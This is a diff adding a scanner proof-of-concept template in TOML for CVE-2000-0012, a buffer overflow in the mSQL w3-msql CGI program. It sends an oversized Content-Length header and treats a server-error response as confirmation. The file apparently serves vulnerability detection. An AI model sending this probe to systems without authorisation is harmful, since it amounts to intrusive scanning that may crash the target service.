@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "Mini SQL (mSQL) 2.0.11 的 w3-msql CGI 程序在处理超长 content-length 字段时存在缓冲区溢出。本 PoC 通过 HTTP 向 /cgi-bin/w3-msql 发送特制超大 content-length 头，检测目标是否返回异常（超时/崩溃/非预期响应），以验证漏洞存在。仅做无损探测，不触发实际代码执行。"
+id = "POC-AVE-2000-0033"
+name = "CVE-2000-0012 mSQL w3-msql 缓冲区溢出 PoC"
+severity = "critical"
+tags = ["ave-2000-0033"]
+vuln_id = [
+    "CVE-2000-0012",
+    "AVE-2000-0033",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/w3-msql"
+protocol = "http"
+
+[poc.requests.body]
+content = "x=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Length = "999999"
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
